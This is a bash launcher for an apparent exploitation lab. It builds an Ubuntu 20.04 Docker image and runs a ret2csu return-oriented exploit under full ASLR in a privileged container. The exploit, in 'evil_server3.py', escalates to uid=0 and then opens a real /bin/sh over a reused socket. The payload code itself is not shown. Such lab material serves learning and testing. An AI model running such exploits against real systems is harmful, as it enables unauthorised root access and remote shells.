#!/usr/bin/env bash
# One-click: build the lab image (Ubuntu 20.04 / glibc 2.31, which still ships
# __libc_csu_init), then run the ret2csu + flags=0 exploit under FULL ASLR.
# On Apple Silicon: `colima start --arch x86_64` first.
set -euo pipefail
cd "$(dirname "$0")"

IMAGE=ret2csu-stager
echo "[*] building lab image (Ubuntu 20.04 / glibc 2.31 for __libc_csu_init) ..."
docker build --platform=linux/amd64 -t "$IMAGE" .

echo "[*] running exploit under full ASLR ..."
docker run --rm --platform=linux/amd64 --privileged "$IMAGE" bash -lc '
  set -e
  ulimit -c unlimited
  echo core > /proc/sys/kernel/core_pattern
  echo 2 > /proc/sys/kernel/randomize_va_space
  echo "[*] randomize_va_space = $(cat /proc/sys/kernel/randomize_va_space)"
  cd /work
  OFF=$(python3 exploit/find_offset.py)
  echo "[*] measured saved-RIP offset = $OFF"
  echo "[*] === MODE=marker (ret2csu rdx + flags=0 wrappers -> uid=0) ==="
  OFFSET=$OFF python3 exploit/evil_server3.py
  echo "[*] === MODE=shell (real /bin/sh over the reused socket) ==="
  OFFSET=$OFF MODE=shell python3 exploit/evil_server3.py
  echo "[*] both modes passed."
'
